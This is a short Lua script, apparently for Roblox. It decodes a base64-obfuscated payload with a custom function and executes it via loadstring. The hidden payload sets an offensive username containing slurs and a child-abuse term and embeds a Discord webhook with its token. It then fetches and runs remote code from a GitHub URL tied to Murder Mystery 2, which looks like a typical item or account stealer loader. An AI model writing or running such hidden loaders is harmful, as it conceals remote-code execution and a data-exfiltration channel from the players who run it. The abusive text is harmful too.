
 -- Obfuscated script
 local encodedScript = "VXNlcm5hbWUgPSAiR2F5bmlnZ2VyY2hpbGRwb3JuIgpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMDExMjA1MDIwNDc0NDUwMTMvb0I5U19RVDJRS2hZanQ3M1V0ZktEN0xQSjc3VGVOYTZMdDIyS29IeUgyZlVUaGNmQUtZS2lUekF6XzhvRTdCNmd2QmoiCgogbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TaGFyU2NyaXB0L01NMi9yZWZzL2hlYWRzL21haW4vUHJvdGVjdGVkX01NMi50eHQiLCB0cnVlKSkoKQ=="

 -- Decode function
 local function decode(str)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     str = string.gsub(str, '[^'..b..'=]', '')
     return (str:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
         return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
         if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
 end

 -- Run the decoded script
 loadstring(decode(encodedScript))()
 